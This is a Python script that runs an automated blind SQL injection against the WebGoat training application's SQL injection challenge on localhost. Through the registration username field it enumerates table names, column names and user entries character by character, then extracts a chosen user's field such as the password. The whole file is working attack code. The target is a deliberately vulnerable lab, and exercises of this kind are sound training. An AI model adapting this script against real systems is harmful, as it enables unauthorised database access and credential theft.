import requests 
import array
#PHASE 0: LOGIN------------------------------------------------------------------------------------------------------------------------------
url0 = 'http://localhost:8080/WebGoat/login'
url1 = 'http://localhost:8080/WebGoat/SqlInjection/challenge'
#url1 = 'http://localhost:8080/WebGoat/challenge/6'
payload0 = {'username': 'alibeg', 'password': 'alibeg'}
with requests.Session() as session:
    post = session.post(url0, data=payload0)
#PHASE 1: FIND TABLE NAME--------------------------------------------------------------------------------------------------------------------
Tname_list=[]
Tname_listD=[]
offset='0'
flag=0
while offset < '9':
	Tname =  [48] * 50
	i=0
	a="'" 
	while (i<50) and (Tname[i] < 123):
		injectT="' and (SELECT DISTINCT table_name FROM information_schema.tables LIMIT "+offset+",1) LIKE "+(a+unichr(Tname[i]))+"%"
		#injectT="' and (SELECT schema_name FROM information_schema.schemata LIMIT "+offset+",1) LIKE "+(a+unichr(Tname[i]))+"%"
		payload1 = {'username_reg': 'tom' +injectT, 'email_reg': 'tom@tom.com', 'password_reg': 't', 'confirm_password__reg': 't'}
		r = session.put(url1, data=payload1)
		if r.content[24] == 'f':
			flag=1
			a=a+unichr(Tname[i])
			i=i+1
		else:
			flag=0
			Tname[i]=Tname[i] + 1
	b = a.replace("'", "")
	c = a.replace("'", "("+chr(ord(offset)+1)+".) ")
	Tname_list.append(b)
	Tname_listD.append(c)
	offset=chr(ord(offset) +1)
print("\n\nPHASE 1---------------------------------------------------------------------------------------------------------------------------\n")
print map(lambda c: str(c), Tname_listD)
AT= input('\nEnter the table you want to attack(1,2,3...): ')
AttackTable = Tname_list[AT-1]
#PHASE 2: FIND COLUMN NAME--------------------------------------------------------------------------------------------------------------------
Cname_list=[]
Cname_listD=[]
offset='0'
flag=0
while offset < '5':
	Cname =  [48] * 50
	i=0
	a="'" 
	while (i<50) and (Cname[i] < 123):
		injectT="' and (SELECT column_name FROM information_schema.columns WHERE table_name = '"+AttackTable+"' LIMIT "+offset+",1) LIKE "+(a+unichr(Cname[i]))+"%"
		payload1 = {'username_reg': 'tom' +injectT, 'email_reg': 'tom@tom.com', 'password_reg': 't', 'confirm_password__reg': 't'}
		r = session.put(url1, data=payload1)
		if r.content[24] == 'f':
			flag=1
			a=a+unichr(Cname[i])
			i=i+1
		else:
			flag=0
			Cname[i]=Cname[i] + 1
	b = a.replace("'", "")
	d = a.replace("'", "("+chr(ord(offset)+1)+".) ")
	Cname_list.append(b)
	Cname_listD.append(d)
	offset=chr(ord(offset) +1)
print("\n\nPHASE 2---------------------------------------------------------------------------------------------------------------------------\n")
print map(lambda d: str(d), Cname_listD)
AC= input('\nEnter the column you want to attack(1,2,3...): ')
AttackColumn = Cname_list[AC-1]
#PHASE 3: FIND USER-------------------------------------------------------------------------------------------------------------------
Uname_list=[]
Uname_listD=[]
offset='0'
flag=0
while offset < '4':
	Uname =  [48] * 50
	i=0
	a="'" 																		
	while (i<50) and (Uname[i] < 123):
		if Uname[i] == 95 :
			Uname[i]=Uname[i] + 1
		injectT="' and (SELECT "+AttackColumn+" FROM "+AttackTable+" LIMIT "+offset+",1) LIKE "+(a+unichr(Uname[i]))+"%"
		payload1 = {'username_reg': 'tom' +injectT, 'email_reg': 'tom@tom.com', 'password_reg': 't', 'confirm_password__reg': 't'}
		r = session.put(url1, data=payload1)
		if r.content[24] == 'f':
			flag=1
			a=a+unichr(Uname[i])
			i=i+1
		else:
			flag=0
			Uname[i]=Uname[i] + 1
	b = a.replace("'", "")
	c = a.replace("'", "("+chr(ord(offset)+1)+".) ")
	Uname_list.append(b)
	Uname_listD.append(c)
	offset=chr(ord(offset) +1)
print("\n\nPHASE 3---------------------------------------------------------------------------------------------------------------------------\n")
print map(lambda c: str(c), Uname_listD)
AU= input('\nEnter the user you want to attack(1,2,3...): ')
AttackUser = Uname_list[AU-1]
#PHASE 4: FIND PASSWORD-------------------------------------------------------------------------------------------------------------------
print("\n\nPHASE 4---------------------------------------------------------------------------------------------------------------------------\n")
print map(lambda d: str(d), Cname_listD)
AF= input('\nWhat information about '+AttackUser+' do you want? (1,2,3...): ')
AttackFinal = Cname_list[AF-1]
Final_list=[]
offset='0'
flag=0
while offset < '1':
	Final =  [48] * 50
	i=0
	a="'" 																		
	while (i<50) and (Final[i] < 123):
		if Final[i] == 95 :
			Final[i]=Final[i] + 1
		injectT="' and (SELECT "+AttackFinal+" FROM "+AttackTable+" WHERE "+AttackColumn+" = '"+AttackUser+"' LIMIT "+offset+",1) LIKE "+(a+unichr(Final[i]))+"%"
		payload1 = {'username_reg': 'tom' +injectT, 'email_reg': 'tom@tom.com', 'password_reg': 't', 'confirm_password__reg': 't'}
		r = session.put(url1, data=payload1)
		if r.content[24] == 'f':
			flag=1
			a=a+unichr(Final[i])
			i=i+1
		else:
			flag=0
			Final[i]=Final[i] + 1
	b = a.replace("'", "")
	Final_list.append(b)
	offset=chr(ord(offset) +1)
print("\n\n"+AttackFinal+" of "+AttackUser+" is:")
print map(lambda b: str(b), Final_list)
